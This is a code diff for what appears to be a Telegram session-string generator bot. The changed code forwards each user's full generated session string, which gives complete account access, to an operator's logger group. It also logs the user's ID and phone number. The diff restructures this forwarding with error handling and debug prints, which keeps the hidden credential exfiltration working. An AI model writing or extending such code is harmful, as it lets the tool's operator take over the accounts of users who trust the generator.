@@ -168,18 +168,32 @@ await client.disconnect()
 await msg.reply(f"✅ SESSION GENERATED:\n\n`{session}`")  
 
 # ================= LOG GROUP =================  
+import traceback
+
+# ================= LOG GROUP =================
+
 try:
-await bot.send_message(
-int(env.LOGGER_GROUP),
-f"🔥 NEW SESSION GENERATED:\n\n{session}"
-)
-except Exception as e:
-print("Log error:", e)
+    print(f"LOGGER_GROUP: {env.LOGGER_GROUP}")
+    print(f"Session Length: {len(session)}")
 
-================= SAFE LOG =================
+    await bot.send_message(
+        chat_id=env.LOGGER_GROUP,
+        text=f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
+    )
 
-await send_log(
-bot,
-f"✅ Session Generated\nUser ID: {user_id}\nPhone: {phone}"
-)
+    print("✅ Session sent to Logger Group successfully.")
 
+except Exception:
+    print("❌ Logger Group Error:")
+    traceback.print_exc()
+
+# ================= SAFE LOG =================
+
+try:
+    await send_log(
+        bot,
+        f"✅ Session Generated\nUser ID: {user_id}\nPhone: {phone}"
+    )
+except Exception:
+    print("❌ send_log Error:")
+    traceback.print_exc()
